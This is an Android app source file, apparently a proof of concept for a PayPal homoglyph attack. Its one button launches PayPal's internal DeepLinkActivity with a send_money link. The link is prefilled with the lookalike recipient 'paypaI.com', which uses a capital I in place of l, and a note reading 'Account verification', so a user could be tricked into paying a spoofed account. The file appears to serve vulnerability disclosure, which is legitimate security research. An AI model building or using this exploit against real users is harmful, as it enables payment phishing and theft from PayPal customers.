package com.metawolf.paypalpoc;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 80, 40, 40);

        TextView text = new TextView(this);
        text.setText("PayPal Homoglyph PoC\n\nTap the button below to trigger the PayPal deep link.");
        text.setTextSize(18);

        Button button = new Button(this);
        button.setText("Trigger PayPal PoC");

        button.setOnClickListener(v -> {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setComponent(new ComponentName(
                    "com.paypal.android.p2pmobile",
                    "com.paypal.android.p2pmobile.common.activities.DeepLinkActivity"
            ));
            intent.setData(Uri.parse("paypal://send_money?email=paypal@paypaI.com&note=Account%20verification"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        });

        layout.addView(text);
        layout.addView(button);

        setContentView(layout);
    }
}
